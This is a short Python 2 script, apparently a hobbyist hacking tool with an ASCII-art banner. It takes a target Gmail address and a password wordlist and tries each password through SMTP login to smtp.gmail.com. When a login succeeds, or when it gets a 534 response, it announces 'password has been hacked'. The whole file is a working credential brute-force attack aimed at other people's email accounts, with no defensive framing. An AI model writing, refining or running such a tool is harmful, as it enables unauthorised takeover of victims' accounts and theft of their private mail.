#!/usr/bin/python

from smtplib import SMTP_SSL,SMTPAuthenticationError
from os import system
W="\033[0m"
R="\033[91m"
G="\033[92m"
Y="\033[93m"
B="\033[94m"
def main():
   print Y+'================================================='
   print B+ '               lotfi haking                  '
   print Y+'================================================='
   print '               ++++++++++++++++++++              '
   print '\n                                               '
   print '  _,.                                            '
   print '                                                 '
   print '                                                 '
   print R+ '           lotfi                               '
   print Y+'       _,.                   '
   print '     ,` -.)                  '
   print '    ( _/-\\-._               '
   print '   /,|`--._,-^|            , '
   print '   \_| |`-._/||          , | '
   print '     |  `-, / |         /  / '
   print '     |     || |        /  /  '
   print '      `r-._||/   __   /  /   '
   print '  __,-<_     )`-/  `./  /    '
   print '  \   `---    \   / /  /     '
   print '     |           |./  /      '
   print '     /           //  /       '
   print ' \_/  \         |/  /        '
   print '  |    |   _,^- /  /         '
   print '  |    , ``  (\/  /_         '
   print '   \,.->._    \X-=/^         '
   print '   (  /   `-._//^`           '
   print '    `Y-.____(__}             '
   print '     |     {__)              ' 
   print '           ()   '+B+'V.1.0        '

main()
print R+'[1] '+G+'start the attack'
print R+'[2] '+G+'exit'+W
option = input('==>'+R)
if option == 1:
	email=raw_input(W+'target gmail :'+G)
	file_path = raw_input(W+'path of passwords file :'+G)
	passlist= open(file_path,'r').readlines()
	print W+" number of passwords : "+B+str(len(passlist))+W
else:
   system('clear')
   exit()
server=SMTP_SSL("smtp.gmail.com",465)
server.ehlo()
i=0
for pw in passlist:
	i+=1
	try:
		server.login(email,pw)
		system('clear')
		print W+"password has been hacked :"+G+pw
		print "\n^_^"
		break
	except SMTPAuthenticationError as e:
		if "534" in str(e):
			system('clear')
			print W+"password has been hacked :"+G+pw
			print "\n^_^"
			break
		else:
			print Y+str(i*100/len(passlist))+"%"+W+"/ password not found :"+R+pw

server.close()
